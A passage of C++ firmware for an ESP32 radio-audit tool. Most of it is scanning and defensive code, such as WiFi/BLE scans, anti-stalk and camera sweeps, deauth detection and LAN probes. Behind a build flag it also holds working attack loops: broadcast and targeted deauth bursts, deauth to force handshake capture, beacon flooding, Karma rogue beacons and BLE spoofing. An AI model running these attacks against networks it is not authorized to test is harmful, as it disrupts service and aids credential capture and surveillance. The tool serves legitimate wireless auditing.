  const uint16_t id = static_cast<uint16_t>(strtol(manufacturerHex.substr(0, 2).c_str(), nullptr, 16)) |
                      (static_cast<uint16_t>(strtol(manufacturerHex.substr(2, 2).c_str(), nullptr, 16)) << 8);
  const std::string sd = bleCompanyById(id);
  return sd.empty() ? bleCompany(manufacturerHex) : sd;  // SD db first, else built-in / "0xNNNN"
}
}  // namespace ra

void RadioAuditActivity::onEnter() {
  Activity::onEnter();
  selectedAction = 0;
  currentCategory = -1;
  selectedCategory = 0;
  selectedItem = 0;
  showingDetails = false;
  showingFindings = false;
  showingTarget = false;
  showingCameraList = false;
  showingMdnsList = false;
  targetFromMdnsList = false;
  mdnsResults.clear();
  mdnsSel = 0;
  targetMenuOpen = false;
  targetIsCamera = false;
  targetIsFindMy = false;
  locating = false;
  targetLocatable = false;
  clientFindings.clear();

  // Reserve the result vectors up front, while the heap is freshest and least
  // fragmented. Scans clear() (which keeps capacity) then push_back, so they
  // never reallocate mid-scan -- a reallocation under BLE-fragmented heap was
  // throwing bad_alloc -> abort(). Caps match the merge-time limits.
  wifiFindings.reserve(MAX_WIFI_FINDINGS);
  bleFindings.reserve(MAX_BLE_FINDINGS);
  // Do NOT reserve clientFindings/probeFindings/auditFindings here: they stay empty
  // through the WiFi/BLE scan but their reserves (~16 KB) would be held during it,
  // leaving the BLE scan only ~3 KB free (BLEDevice::init eats ~72 KB) -> bad_alloc
  // -> abort() in a dense area. They fill later (report build / client recon), when
  // BLE is down and heap is free, so on-demand growth there is safe.

  ouiOpen();      // open the SD OUI database for vendor lookups (closed in onExit)
  bleCompOpen();  // open the SD BLE company-id database (closed in onExit)

  status = "Ready";
  requestUpdate();
}

void RadioAuditActivity::onExit() {
  Activity::onExit();
  if (capturing) {
    // Tear down promiscuous capture and close the SD file before destruction.
    g_pcap.active = false;
    if (g_hs) g_hs->active = false;
    if (g_dd) g_dd->active = false;
    if (g_drone) g_drone->active = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    if (captureMode == CaptureMode::Pcap)
      pcapDrain(captureFile);
    else if (captureMode == CaptureMode::DeauthDetect)
      processDeauthDetect();
    else if (captureMode == CaptureMode::Handshake)
      processHandshakes();
    if (captureFile.isOpen()) {
      captureFile.flush();
      captureFile.close();
    }
    capturing = false;
    g_pcap.buf = nullptr;
    g_pcapBuf.reset();  // return the 32 KB ring to the heap
    g_hs.reset();       // return the handshake slot table to the heap
    g_dd.reset();       // return the detector slot table to the heap
    g_drone.reset();    // return the drone slot table to the heap
  }
  if (locating) {
    locating = false;
    esp_wifi_set_promiscuous(false);
  }
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
  if (state == State::ATTACKING) {
#if defined(RADIO_AUDIT_ENABLE_BLE)
    if (attackMode == AttackMode::BleSpoof) {
      BLEDevice::getAdvertising()->stop();
      shutdownBleController();
    }
#endif
    if (attackMode == AttackMode::Karma) {
      if (g_karma) g_karma->active = false;
      esp_wifi_set_promiscuous(false);
      esp_wifi_set_promiscuous_rx_cb(nullptr);
      g_karma.reset();
    }
    WiFi.disconnect(false, false);
    WiFi.mode(WIFI_OFF);
  }
#endif
  if (mdnsActive) {  // exited mid-query: stop the responder and drop the association
    MDNS.end();
    mdnsActive = false;
    WiFi.disconnect(false, false);
    WiFi.mode(WIFI_OFF);
  }
  ouiClose();                  // close the SD OUI database handle
  bleCompClose();              // close the SD BLE company-id database handle
  if (captureFile.isOpen()) {  // e.g. exited Scheduled Log without pressing Stop
    captureFile.flush();
    captureFile.close();
  }
  WiFi.scanDelete();
  shutdownBleController();
}

void RadioAuditActivity::loop() {
  if (state == State::WIFI_SCANNING) {
    processWifiScan();
    return;
  }

  // Live capture (PCAP or handshake): process new frames to SD every tick, hop
  // channels, refresh counters. Back stops; in handshake mode Confirm fires an
  // in-screen deauth to force a handshake (no need to leave the screen).
  if (state == State::CAPTURING) {
    if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
      if (captureMode == CaptureMode::Pcap)
        stopPcapCapture();
      else if (captureMode == CaptureMode::DeauthDetect)
        stopDeauthDetect();
      else if (captureMode == CaptureMode::DroneScan)
        stopDroneScan();
      else
        stopHandshakeCapture();
      return;
    }
    if (mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      if (captureMode == CaptureMode::Pcap) {
        stopPcapCapture();
        return;
      }
      if (captureMode == CaptureMode::DeauthDetect) {
        stopDeauthDetect();
        return;
      }
      if (captureMode == CaptureMode::DroneScan) {
        stopDroneScan();
        return;
      }
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
      handshakeDeauthTarget();  // force the target to reconnect; channel locks on
      return;
#else
      stopHandshakeCapture();
      return;
#endif
    }
    if (captureMode == CaptureMode::Pcap)
      captureBytesWritten += pcapDrain(captureFile);
    else if (captureMode == CaptureMode::DeauthDetect)
      processDeauthDetect();
    else if (captureMode == CaptureMode::Handshake)
      processHandshakes();
    // (DroneScan needs no per-tick processing -- the callback fills the slots.)
    const uint32_t now = millis();
    if (!captureChannelLocked && now - captureLastHopMs >= 300) {
      captureChannel = (captureChannel >= 13) ? 1 : static_cast<uint8_t>(captureChannel + 1);
      esp_wifi_set_channel(captureChannel, WIFI_SECOND_CHAN_NONE);
      captureLastHopMs = now;
    }
    if (now - captureLastFlushMs >= 1500) {
      if (captureFile.isOpen()) captureFile.flush();
      captureLastFlushMs = now;
      requestUpdate();  // refresh on-screen counters
    }
    return;
  }

  // Anti-Stalk Watch: re-scan BLE on an interval; Back/Confirm stops. The scan
  // itself blocks (~4 s), so button presses register on the idle ticks between.
  if (state == State::STALKING) {
    if (mappedInput.wasPressed(MappedInputManager::Button::Back) ||
        mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      stopAntiStalk();
      return;
    }
    if (millis() - stalkLastPassMs >= STALK_INTERVAL_MS) antiStalkPass();
    return;
  }

  if (state == State::GUARDIAN) {
    if (mappedInput.wasPressed(MappedInputManager::Button::Back) ||
        mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      stopGuardian();
      return;
    }
    if (millis() - guardianLastMs >= GUARDIAN_INTERVAL_MS) guardianPass();
    return;
  }

  if (state == State::LOG_SETUP) {
    if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
      state = State::DONE;  // cancel -> back to the menu
      requestUpdate();
      return;
    }
    // Up/Down move between the three fields; Left/Right change the selected value.
    if (mappedInput.wasPressed(MappedInputManager::Button::Up)) {
      logSetupField = (logSetupField + LOG_SETUP_FIELDS - 1) % LOG_SETUP_FIELDS;
      requestUpdate();
    } else if (mappedInput.wasPressed(MappedInputManager::Button::Down)) {
      logSetupField = (logSetupField + 1) % LOG_SETUP_FIELDS;
      requestUpdate();
    } else if (mappedInput.wasPressed(MappedInputManager::Button::Left) ||
               mappedInput.wasPressed(MappedInputManager::Button::Right)) {
      const int dir = mappedInput.wasPressed(MappedInputManager::Button::Right) ? 1 : -1;
      int* sel = logSetupField == 0 ? &logIntervalSel : logSetupField == 1 ? &logDurationSel : &logRadioSel;
      const int count = logSetupField == 0   ? LOG_INTERVAL_COUNT
                        : logSetupField == 1 ? LOG_DURATION_COUNT
                                             : LOG_RADIO_COUNT;
      *sel = (*sel + dir + count) % count;
      requestUpdate();
    } else if (mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      logIntervalMs = static_cast<uint32_t>(LOG_INTERVAL_SECS[logIntervalSel]) * 1000;
      startScheduledLog();
    }
    return;
  }

  if (state == State::LOGGING) {
    if (mappedInput.wasPressed(MappedInputManager::Button::Back) ||
        mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      stopScheduledLog();
      return;
    }
    // Auto-stop once the chosen run-time elapses (0 = run until stopped).
    const uint32_t durMs = LOG_DURATION_SECS[logDurationSel] * 1000;
    if (durMs > 0 && millis() - logStartMs >= durMs) {
      stopScheduledLog();
      return;
    }
    if (millis() - logLastMs >= logIntervalMs) scanLogPass();
    return;
  }

  // mDNS Browser: query one service type per tick (each blocks ~1 s, well under
  // the watchdog limit). Back cancels and shows whatever responded so far.
  if (state == State::MDNS_QUERY) {
    if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
      finishMdnsQuery();
      return;
    }
    runMdnsQueryPass();
    return;
  }

  // LAN Scanner: ARP-sweep a batch of hosts per tick; Back stops early.
  if (state == State::LAN_SCAN) {
    if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
      finishLanScan();
      return;
    }
    lanScanPass();
    return;
  }

  // Port Probe: TCP-connect one port per tick; Back stops early (shows partial).
  if (state == State::PORT_PROBE) {
    if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
      finishPortProbe();
      return;
    }
    portProbePass();
    return;
  }

  // Traceroute: ping one TTL per tick; Back stops early (shows partial).
  if (state == State::TRACEROUTE) {
    if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
      finishTraceroute();
      return;
    }
    traceroutePass();
    return;
  }

  // SNMP Sweep: try one community string per tick; Back stops early (shows partial).
  if (state == State::SNMP_SWEEP) {
    if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
      finishSnmpSweep();
      return;
    }
    snmpSweepPass();
    return;
  }

#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
  // Active attack loop (deauth / beacon flood): aggressive bursts, Back stops.
  if (state == State::ATTACKING) {
    if (mappedInput.wasPressed(MappedInputManager::Button::Back) ||
        mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      stopAttack();
      return;
    }
    const uint32_t now = millis();
    const uint32_t burstInterval = (attackMode == AttackMode::BleSpoof) ? 250 : 50;
    if (now - attackLastMs >= burstInterval) {
      if (attackMode == AttackMode::Deauth && !attackTargets.empty()) {
        const int idx = attackTargets[attackTargetIdx % attackTargets.size()];
        if (idx >= 0 && idx < static_cast<int>(wifiFindings.size())) {
          const auto& w = wifiFindings[idx];
          uint8_t ap[6];
          if (parseBssid(w.bssid, ap)) {
            const uint8_t ch = (w.channel >= 1 && w.channel <= 13) ? static_cast<uint8_t>(w.channel) : 1;
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            attackFrames += sendDeauthBurst(ap, BROADCAST_MAC, 8);
            attackStatusLine = (w.ssid.empty() ? w.bssid : w.ssid) + " CH" + std::to_string(ch);
          }
        }
        attackTargetIdx++;
      } else if (attackMode == AttackMode::Beacon) {
        captureChannel = (captureChannel >= 13) ? 1 : static_cast<uint8_t>(captureChannel + 1);
        esp_wifi_set_channel(captureChannel, WIFI_SECOND_CHAN_NONE);
        attackFrames += sendBeaconFlood(captureChannel, 8);
        attackStatusLine = std::string("CH") + std::to_string(captureChannel);
      } else if (attackMode == AttackMode::Karma) {
        // Beacon every harvested PNL entry on the next channel; the promiscuous
        // callback keeps adding SSIDs as clients probe for them.
        captureChannel = (captureChannel >= 13) ? 1 : static_cast<uint8_t>(captureChannel + 1);
        esp_wifi_set_channel(captureChannel, WIFI_SECOND_CHAN_NONE);
        const int n = g_karma ? g_karma->count : 0;
        for (int k = 0; k < n; k++) attackFrames += sendKarmaBeacon(captureChannel, g_karma->ssids[k]);
        attackStatusLine = std::string("PNL ") + std::to_string(n) + " / CH" + std::to_string(captureChannel);
      } else if (attackMode == AttackMode::BleSpoof) {
#if defined(RADIO_AUDIT_ENABLE_BLE)
        // Rotate a random phantom BLE advertiser each cycle.
        BLEAdvertising* adv = BLEDevice::getAdvertising();
        adv->stop();
        char nm[16];
        snprintf(nm, sizeof(nm), "RI-%04X", static_cast<unsigned>(esp_random() & 0xFFFF));
        char mfr[7];  // 6 non-zero bytes (Arduino String can't hold embedded nulls)
        for (int k = 0; k < 6; k++) mfr[k] = static_cast<char>((esp_random() % 255) + 1);
        mfr[6] = '\0';
        BLEAdvertisementData data;
        data.setName(String(nm));
        data.setManufacturerData(String(mfr));
        adv->setAdvertisementData(data);
        adv->start();
        attackFrames++;
        attackStatusLine = nm;
#endif
      } else if (attackMode == AttackMode::CameraDeauth) {
        esp_wifi_set_channel(captureChannel, WIFI_SECOND_CHAN_NONE);
        if (targetCamHasAp) {
          attackFrames += sendDeauthBurst(targetCamAp, targetCamMac, 8);  // directed: kick the client
          attackStatusLine =
              std::string("client ") + macToString(targetCamMac) + " CH" + std::to_string(captureChannel);
        } else {
          attackFrames += sendDeauthBurst(targetCamMac, BROADCAST_MAC, 8);  // AP cam: kick all clients
          attackStatusLine = std::string("AP ") + macToString(targetCamMac) + " CH" + std::to_string(captureChannel);
        }
      }
      attackLastMs = now;
    }
    if (now - captureLastFlushMs >= 2000) {
      captureLastFlushMs = now;
      requestUpdate();  // refresh frame counter (e-ink redraw pauses tx briefly)
    }
    return;
  }
#endif

  // Live "find it" RSSI locator: sample periodically, any button exits to detail.
  if (locating) {
    if (mappedInput.wasPressed(MappedInputManager::Button::Back) ||
        mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      stopLocator();
      showingTarget = true;
      requestUpdate();
      return;
    }
    const uint32_t now = millis();
    if (locLastSampleMs == 0 || now - locLastSampleMs >= 700) {
      locPrevRssi = locHasSignal ? locCurRssi : locPrevRssi;
      locatorSample();
      locLastSampleMs = millis();
      requestUpdate();
    }
    return;
  }

  // Selectable list of camera-sweep hits: Confirm opens the detail (Locate/Deauth).
  if (showingMdnsList) {
    if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
      showingMdnsList = false;
      requestUpdate();
      return;
    }
    if (mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      if (!mdnsResults.empty()) openMdnsDetail(mdnsSel);
      return;
    }
    const int n = static_cast<int>(mdnsResults.size());
    if (n > 0) {
      buttonNavigator.onNext([this, n] {
        mdnsSel = ButtonNavigator::nextIndex(mdnsSel, n);
        requestUpdate();
      });
      buttonNavigator.onPrevious([this, n] {
        mdnsSel = ButtonNavigator::previousIndex(mdnsSel, n);
        requestUpdate();
      });
    }
    return;
  }

  if (showingCameraList) {
    if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
      showingCameraList = false;
      requestUpdate();
      return;
    }
    if (mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      if (!cameraTargets.empty()) openCameraDetail(cameraSel);
      return;
    }
    const int n = static_cast<int>(cameraTargets.size());
    if (n > 0) {
      buttonNavigator.onNext([this, n] {
        cameraSel = ButtonNavigator::nextIndex(cameraSel, n);
        requestUpdate();
      });
      buttonNavigator.onPrevious([this, n] {
        cameraSel = ButtonNavigator::previousIndex(cameraSel, n);
        requestUpdate();
      });
    }
    return;
  }

  // Per-target deep-scan detail view: scroll lines; Confirm opens the action menu
  // (WiFi AP) or locates (BLE).
  if (showingTarget) {
    // Action menu overlay (mark / deauth / locate) for a WiFi AP.
    if (targetMenuOpen) {
      if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
        targetMenuOpen = false;
        requestUpdate();
        return;
      }
      if (mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
        if (!targetMenuCodes.empty()) runTargetMenuItem(targetMenuCodes[targetMenuSel]);
        return;
      }
      const int n = static_cast<int>(targetMenuCodes.size());
      if (n > 0) {
        buttonNavigator.onNext([this, n] {
          targetMenuSel = ButtonNavigator::nextIndex(targetMenuSel, n);
          requestUpdate();
        });
        buttonNavigator.onPrevious([this, n] {
          targetMenuSel = ButtonNavigator::previousIndex(targetMenuSel, n);
          requestUpdate();
        });
      }
      return;
    }
    if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
      showingTarget = false;
      showingMdnsList = targetFromMdnsList;      // back to the mDNS list if we came from it
      showingCameraList = targetFromCameraList;  // back to the camera list if we came from it
      showingDetails = !targetFromMdnsList && !targetFromCameraList && targetFromList;
      requestUpdate();
      return;
    }
    if (mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      if (targetLocatable) {
        openTargetMenu();  // camera: locate/deauth; WiFi: mark/deauth/locate; BLE: GATT/locate
        return;
      }
      showingTarget = false;
      showingMdnsList = targetFromMdnsList;  // mDNS detail has no actions: Confirm returns to the list
      showingDetails = !targetFromMdnsList && targetFromList;
      requestUpdate();
      return;
    }
    const int lineCount = static_cast<int>(targetLines.size());
    if (lineCount > 0) {
      buttonNavigator.onNext([this, lineCount] {
        targetScroll = ButtonNavigator::nextIndex(targetScroll, lineCount);
        requestUpdate();
      });
      buttonNavigator.onPrevious([this, lineCount] {
        targetScroll = ButtonNavigator::previousIndex(targetScroll, lineCount);
        requestUpdate();
      });
    }
    return;
  }

  if (showingDetails || showingFindings) {
    const int itemCount = showingFindings ? static_cast<int>(auditFindings.size())
                                          : (showingBleDetails ? static_cast<int>(bleFindings.size())
                                                               : static_cast<int>(wifiFindings.size()));
    // Back closes the list. Select (Confirm) deep-scans the highlighted target.
    if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
      showingDetails = false;
      showingFindings = false;
      requestUpdate();
      return;
    }
    if (mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      if (showingFindings) {
        // Jump to the related target's deep scan when the finding maps to one.
        if (itemCount > 0 && selectedFinding < itemCount) {
          const AuditFinding& f = auditFindings[selectedFinding];
          if (f.wifiIndex >= 0) {
            showingFindings = false;
            showingDetails = true;
            showingBleDetails = false;
            selectedFinding = f.wifiIndex;
            deepScanWifiTarget(f.wifiIndex);
            return;
          }
          if (f.bleIndex >= 0) {
            showingFindings = false;
            showingDetails = true;
            showingBleDetails = true;
            selectedFinding = f.bleIndex;
            deepScanBleTarget(f.bleIndex);
            return;
          }
        }
        showingFindings = false;
        requestUpdate();
        return;
      }
      if (itemCount > 0) {
        if (showingBleDetails)
          deepScanBleTarget(selectedFinding);
        else
          deepScanWifiTarget(selectedFinding);
      }
      return;
    }
    if (itemCount > 0) {
      buttonNavigator.onNext([this, itemCount] {
        selectedFinding = ButtonNavigator::nextIndex(selectedFinding, itemCount);
        requestUpdate();
      });
      buttonNavigator.onPrevious([this, itemCount] {
        selectedFinding = ButtonNavigator::previousIndex(selectedFinding, itemCount);
        requestUpdate();
      });
    }
    return;
  }

  if (currentCategory < 0) {
    // Top-level category list.
    if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
      onGoHome(HomeMenuItem::RADIO_AUDIT);
      return;
    }
    if (mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      currentCategory = selectedCategory;
      selectedItem = 0;
      requestUpdate();
      return;
    }
    buttonNavigator.onNext([this] {
      selectedCategory = ButtonNavigator::nextIndex(selectedCategory, CATEGORY_COUNT);
      requestUpdate();
    });
    buttonNavigator.onPrevious([this] {
      selectedCategory = ButtonNavigator::previousIndex(selectedCategory, CATEGORY_COUNT);
      requestUpdate();
    });
    return;
  }

  // Inside a category: items run leaf actions; Back returns to the category list.
  const ActionCategory& cat = ACTION_CATEGORIES[currentCategory];
  if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
    currentCategory = -1;
    requestUpdate();
    return;
  }
  if (mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
    runAction(cat.items[selectedItem]);
    return;
  }
  buttonNavigator.onNext([this, &cat] {
    selectedItem = ButtonNavigator::nextIndex(selectedItem, cat.count);
    requestUpdate();
  });
  buttonNavigator.onPrevious([this, &cat] {
    selectedItem = ButtonNavigator::previousIndex(selectedItem, cat.count);
    requestUpdate();
  });
}

void RadioAuditActivity::runAction(Action action) {
  switch (action) {
    case Action::QuickScan:
      startScan(false, ScanScope::Both);
      return;
    case Action::DeepScan:
      startScan(true, ScanScope::Both);
      return;
    case Action::WifiScan:
      startScan(false, ScanScope::WifiOnly);
      return;
    case Action::BleScan:
      startScan(false, ScanScope::BleOnly);
      return;
    case Action::ClientRecon:
      startProbeScan();
      return;
    case Action::ChannelUsage:
      showChannelUsage();
      return;
    case Action::AuditFindings:
      showAuditFindings();
      return;
    case Action::WifiResults:
      showWifiDetails();
      return;
    case Action::BleResults:
      showBleDetails();
      return;
    case Action::ReportViewer:
      // Browse + read saved reports/captures on-device (TXT opens in the reader).
      startActivityForResult(std::make_unique<FileBrowserActivity>(renderer, mappedInput, "/.radioink",
                                                                   FileBrowserActivity::Mode::AllFiles),
                             [this](const ActivityResult&) { requestUpdate(); });
      return;
    case Action::ShareWeb:
      // Serve the findings as a web page: SoftAP captive portal + a Wi-Fi-join QR.
      // Scan -> join -> the portal opens the report like a website.
      startActivityForResult(
          std::make_unique<WebReportActivity>(renderer, mappedInput, std::string(makeTextReport().c_str())),
          [this](const ActivityResult&) { requestUpdate(); });
      return;
    case Action::CameraSweep:
      startCameraSweep();
      return;
    case Action::TrackerSweep:
      startTrackerSweep();
      return;
    case Action::ThreatSweep:
      startThreatSweep();
      return;
    case Action::AntiStalk:
      startAntiStalk();
      return;
    case Action::DroneScan:
      startDroneScan();
      return;
    case Action::Guardian:
      startGuardian();
      return;
    case Action::ScheduledLog:
      showLogSetup();
      return;
    case Action::MdnsBrowse:
      startMdnsBrowse();
      return;
    case Action::LanScan:
      startLanScan();
      return;
    case Action::NtpSync:
      startNtpSync();
      return;
    case Action::NetInfo:
      startNetInfo();
      return;
    case Action::PortProbe:
      startPortProbe();
      return;
    case Action::SubnetCalc:
      showSubnetCalc();
      return;
    case Action::Traceroute:
      startTraceroute();
      return;
    case Action::DhcpProbe:
      startDhcpProbe();
      return;
    case Action::SnmpSweep:
      startSnmpSweep();
      return;
    case Action::WpsAudit:
      showWpsAudit();
      return;
    case Action::SystemStats:
      showSystemStats();
      return;
    case Action::I2cScan:
      showI2cScan();
      return;
    case Action::DeauthDetector:
      startDeauthDetect();
      return;
    case Action::About:
      showAbout();
      return;
    case Action::ExportText:
      exportText();
      return;
    case Action::ExportCsv:
      exportCsv();
      return;
    case Action::ExportJson:
      exportJson();
      return;
    case Action::ExportWigle:
      exportWigle();
      return;
    case Action::CapturePcap:
      startPcapCapture();
      return;
    case Action::CaptureHandshake:
      startHandshakeCapture();
      return;
    case Action::DeauthAttack:
    case Action::DeauthSelected:
    case Action::BeaconFlood:
    case Action::EvilTwin:
    case Action::BleSpoof:
    case Action::Karma:
    case Action::DeauthCameras:
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
      if (action == Action::DeauthAttack)
        startDeauthAttack();
      else if (action == Action::DeauthSelected)
        startDeauthSelected();
      else if (action == Action::BeaconFlood)
        startBeaconFlood();
      else if (action == Action::EvilTwin)
        startEvilTwin();
      else if (action == Action::BleSpoof)
        startBleSpoof();
      else if (action == Action::Karma)
        startKarma();
      else
        startDeauthCameras();
#endif
      return;
    case Action::COUNT:
      return;  // sentinel, never dispatched
  }
}

void RadioAuditActivity::startScan(bool deepScan, ScanScope scope) {
  deepScanMode = deepScan;
  scanScope = scope;
  scanTotalPasses = deepScan ? DEEP_SCAN_PASSES : QUICK_SCAN_PASSES;
  scanCurrentPass = 1;
  wifiFindings.clear();
  bleFindings.clear();
  auditFindings.clear();
  probeFindings.clear();
  beginScanPass();
}

void RadioAuditActivity::beginScanPass() {
  // BLE-only skips the Wi-Fi pass entirely; everything else starts with Wi-Fi
  // (which chains into BLE when the scope includes it).
  if (scanScope == ScanScope::BleOnly) {
    startBleScan();
  } else {
    startWifiScanPass();
  }
}

void RadioAuditActivity::startWifiScanPass() {
  state = State::WIFI_SCANNING;
  status =
      (String(deepScanMode ? "Deep WiFi pass " : "Scanning WiFi ") + scanCurrentPass + "/" + scanTotalPasses).c_str();
  requestUpdate();

  resetWifiForScan();
  delay(250);
  WiFi.mode(WIFI_STA);
  delay(100);
  WiFi.scanNetworks(true, true);
}

void RadioAuditActivity::processWifiScan() {
  const int16_t result = WiFi.scanComplete();
  if (result == WIFI_SCAN_RUNNING) return;

  if (result == WIFI_SCAN_FAILED) {
    status = "WiFi scan failed";
    state = State::ERROR;
    requestUpdate();
    return;
  }

  for (int i = 0; i < result; i++) {
    WifiFinding finding;
    finding.ssid = WiFi.SSID(i).c_str();
    finding.bssid = WiFi.BSSIDstr(i).c_str();
    finding.rssi = WiFi.RSSI(i);
    finding.rssiMin = finding.rssi;
    finding.rssiMax = finding.rssi;
    finding.rssiSum = finding.rssi;
    finding.channel = WiFi.channel(i);
    finding.seenCount = 1;
    finding.auth = authName(WiFi.encryptionType(i));
    finding.hidden = finding.ssid.empty();
    const auto* rec = static_cast<const wifi_ap_record_t*>(WiFi.getScanInfoByIndex(i));
    finding.wps = rec && rec->wps;
    mergeWifiFinding(std::move(finding));
  }
  std::sort(wifiFindings.begin(), wifiFindings.end(),
            [](const WifiFinding& a, const WifiFinding& b) { return a.rssi > b.rssi; });
  WiFi.scanDelete();

  if (scanScope == ScanScope::WifiOnly) {
    finishScanPass();
  } else {
    startBleScan();
  }
}

void RadioAuditActivity::prepWifiSta() {
  shutdownBleController();
  WiFi.scanDelete();
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_STA);
  delay(150);
}

void RadioAuditActivity::startBleScan() {
#if defined(RADIO_AUDIT_ENABLE_BLE)
  state = State::BLE_SCANNING;
  status =
      (String(deepScanMode ? "Deep BLE pass " : "Scanning BLE ") + scanCurrentPass + "/" + scanTotalPasses).c_str();
  requestUpdateAndWait();
  // Streaming (erase-as-you-go), not the accumulating runBleScan: a dense BLE
  // environment (100+ devices -- apartment building, office, conference) can
  // grow NimBLE's internal result map faster than a single 2s window drains
  // it, exhausting heap (bad_alloc -> abort() with -fno-exceptions). Passive
  // mode here (no scan-response wait) makes every advert immediately erasable.
  if (!runBleScanStreaming(/*windows=*/1)) status = "BLE skipped (low memory)";
#endif
  finishScanPass();
}

#if defined(RADIO_AUDIT_ENABLE_BLE)
// Turn WiFi off, bring up the BLE controller (heap-floor guarded), and run
// `windows` bounded scan passes into bleFindings (clearing between to cap peak
// memory). Returns false if skipped for low heap. Shared by every BLE scan.
void RadioAuditActivity::ingestStreamedAdvert(BLEAdvertisedDevice& device) {
  // Same per-device merge as absorbBleResults, but driven one advert at a time
  // from the streaming callback (the device is erased right after this returns).
  BleFinding finding;
  finding.address = device.getAddress().toString().c_str();
  finding.addrType = device.getAddressType();  // needed to connect (AirTags use random addrs)
  finding.name = device.haveName() ? device.getName().c_str() : "";
  finding.rssi = device.getRSSI();
  finding.rssiMin = finding.rssi;
  finding.rssiMax = finding.rssi;
  finding.rssiSum = finding.rssi;
  finding.seenCount = 1;
  finding.hasTxPower = device.haveTXPower();
  finding.txPower = finding.hasTxPower ? device.getTXPower() : 0;
  finding.manufacturerHex = device.haveManufacturerData() ? hexEncode(device.getManufacturerData()).c_str() : "";
  if (device.haveServiceUUID()) finding.serviceUuid = device.getServiceUUID().toString().c_str();
  if (device.haveServiceData()) {
    finding.serviceDataUuid = device.getServiceDataUUID().toString().c_str();
    finding.serviceDataHex = hexEncode(device.getServiceData()).c_str();
  }
  mergeBleFinding(std::move(finding));
}

namespace {
// Streaming scan callback: hand each advert to the activity, then erase it from
// the BLE result map so the map stays ~empty. With a passive scan the GAP handler
// fires this synchronously per advert (no scan-response wait), so peak memory is
// one device regardless of how hard a BLE-spam flood pushes.
class StreamingScanCb : public BLEAdvertisedDeviceCallbacks {
 public:
  RadioAuditActivity* owner = nullptr;
  BLEScan* scan = nullptr;
  void onResult(BLEAdvertisedDevice dev) override {
    if (owner) owner->ingestStreamedAdvert(dev);
    if (scan) scan->erase(dev.getAddress());
  }
};
StreamingScanCb g_streamCb;
}  // namespace

bool RadioAuditActivity::runBleScanStreaming(int windows, bool active) {
  WiFi.scanDelete();
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
  delay(200);

  const uint32_t freeHeap = ESP.getFreeHeap();
  LOG_DBG("RADIO", "BLE pre-scan heap %u (streaming)", static_cast<unsigned>(freeHeap));
  if (freeHeap < BLE_HEAP_FLOOR_START) {
    LOG_ERR("RADIO", "BLE skipped: heap %u < %u", static_cast<unsigned>(freeHeap), BLE_HEAP_FLOOR_START);
    return false;
  }
  if (!bleReady) {
    BLEDevice::init("RadioInk");
    bleScan = BLEDevice::getScan();
    bleReady = true;
  }
  if (!bleScan) {
    shutdownBleController();
    return false;
  }
  // Real operating point once the controller is up (init eats ~65 KB): this is the
  // budget the advert callback churns against. Logged (ERR level so it lands in the
  // SD log by default) to size any future fragmentation guard against real numbers.
  LOG_ERR("RADIO", "BLE post-init free=%u maxblock=%u", static_cast<unsigned>(ESP.getFreeHeap()),
          static_cast<unsigned>(ESP.getMaxAllocHeap()));
  g_streamCb.owner = this;
  g_streamCb.scan = bleScan;
  // The callback erases each advert as it arrives, so the Bluedroid result map
  // never accumulates -- memory stays bounded regardless of how many devices are
  // present (this is what prevents an OOM abort in a dense BLE environment) and
  // regardless of active vs passive. Active adds scan-request TX to pull in device
  // names/scan-responses (used by the camera/tracker sweeps for name matching).
  bleScan->setAdvertisedDeviceCallbacks(&g_streamCb, /*wantDuplicates=*/false, /*shouldParse=*/true);
  bleScan->setActiveScan(active);
  bleScan->setInterval(320);
  bleScan->setWindow(80);
  for (int w = 0; w < windows; w++) {
    bleScan->start(2, false);
    bleScan->clearResults();
  }
  bleScan->setAdvertisedDeviceCallbacks(nullptr);
  g_streamCb.owner = nullptr;
  g_streamCb.scan = nullptr;
  shutdownBleController();
  return true;
}
#endif

void RadioAuditActivity::shutdownBleController() {
#if defined(RADIO_AUDIT_ENABLE_BLE)
  if (bleScan) {
    bleScan->stop();
    bleScan->clearResults();
  }
  if (bleReady) {
    // Do not pass true here. Releasing controller memory can make the next
    // BLE init unsafe without reboot, which breaks Deep Scan pass 2.
    BLEDevice::deinit(false);
  }
  bleScan = nullptr;
  bleReady = false;
  delay(500);
#endif
}

void RadioAuditActivity::resetWifiForScan() {
  WiFi.scanDelete();
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
  delay(250);
}

void RadioAuditActivity::finishScanPass() {
  std::sort(wifiFindings.begin(), wifiFindings.end(),
